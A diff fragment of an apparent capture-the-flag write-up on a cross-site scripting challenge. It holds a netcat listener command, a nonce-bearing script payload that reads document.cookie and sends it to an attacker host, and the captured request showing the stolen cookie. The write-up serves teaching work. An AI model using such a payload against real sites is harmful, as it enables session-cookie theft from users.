@@ -20,7 +20,7 @@ To intercept it, we set up a *netcat* listener, so we could send the cookie to i
 $ nc -nlvk 8080
 Listening on 0.0.0.0 8080
 ```
-Now we went to the admin server for the challenge, and gave it a URL that would visit the target site, get the cookie and send it to us in a GET variable:
+Now we went to the admin server for the challenge, and gave it a URL that would visit the target site, get the cookie and send it to us in a *GET* variable:
 ```
 https://some.vuln.site/?name=<script%20nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D>var%20a%3Ddocument.cookie%3B%20document.location%3D%60http:%2F%2Fcr4ck3rs.com:8080%2F%3Fc%3D%24%7Ba%7D%60<%2Fscript>
 ```
@@ -28,3 +28,15 @@ Without the URL encoding, this is:
 ```
 https://some/vuln.site/?name=<script nonce="LRGWAXOY98Es0zz0QOVmag==">var a=document.cookie; document.location=`http://cr4ckers.com:8080/?c=${a}`</script>
 ```
+In the *netcat* listener, we see something like this:
+```
+Connection received on 35.203.246.8 20340
+GET /?c=secret=4b36b1b8e47f761263796b1defd80745 HTTP/1.1
+Host: cr4ck3rs.com:8080
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+```
+With the cookie contents on the *GET* line.
